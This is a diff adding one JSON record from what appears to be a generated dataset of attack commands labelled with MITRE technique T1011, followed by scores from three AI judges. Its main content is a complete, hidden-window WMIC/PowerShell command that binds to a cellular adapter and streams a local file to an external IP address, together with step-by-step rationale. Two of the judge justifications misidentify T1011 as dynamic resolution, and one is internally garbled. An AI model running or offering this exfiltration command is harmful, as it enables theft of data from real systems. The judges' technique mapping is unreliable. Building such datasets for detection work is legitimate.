@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*Cellular*') }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('203.0.113.9',57483); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Users\\Public\\Documents\\cache.bin'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
+  "explanation": "Leverages WMIC to start PowerShell that binds to a WWAN/Cellular interface and exfiltrates data via TCP to a non-standard port. This uses a cellular medium to bypass the primary corporate network path.",
+  "rationale_steps": [
+    "Locate a mobile broadband (cellular) adapter using WMI.",
+    "Bind the TCP socket to the cellular interface's IPv4 address.",
+    "Connect to an external endpoint on an uncommon port.",
+    "Send file bytes over the WWAN path, consistent with T1011.",
+    "No global routing or adapter settings are changed."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-987933e0-122a57d6",
+  "source_prompt_hash": "987933e0",
+  "timestamp_utc": "2025-09-30T08:13:32.291694Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with properly balanced quotes, backticks, parentheses, and braces, correct PowerShell syntax with appropriate escape sequences, and valid WMIC process call create syntax.",
+        "semantic_score": 4,
+        "semantic_justification": "The command aligns well with T1011 (Dynamic Resolution) by using a cellular network interface to establish command and control communication on a non-standard port, though it uses a hardcoded IP rather than algorithmically determining the endpoint.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T05:54:07.006993Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command line is well-formed with balanced quotes/braces and valid PowerShell syntax; -Command can consume the remainder without extra quoting, and escaping does not break parsing.",
+        "semantic_score": 1,
+        "semantic_justification": "The action exfiltrates to a hard-coded IP over TCP via a cellular interface and does not exhibit dynamic resolution behaviors (no DGA, DNS queries, rotating endpoints, or dynamic DNS).",
+        "combined_score": 3.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T05:55:26.690045Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 2,
+        "syntactic_justification": "The PowerShell command contains incorrect backtick escaping for all variable references (e.g., `$ifc` instead of `$ifc`), which will prevent PowerShell from parsing it correctly when executed via WMIC.",
+        "semantic_score": 0,
+        "semantic_justification": "The command performs data exfiltration to a hardcoded IP address and port, which is entirely unrelated to the T1011 Dynamic Resolution technique focused on algorithmic determination of network endpoints at runtime via methods like DGAs or fast-flux.",
+        "combined_score": 1.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T06:01:45.934203Z"
+      }
+    ],
+    "llm_average_syntactic": 4.0,
+    "llm_average_semantic": 1.667,
+    "llm_average_score": 2.833,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
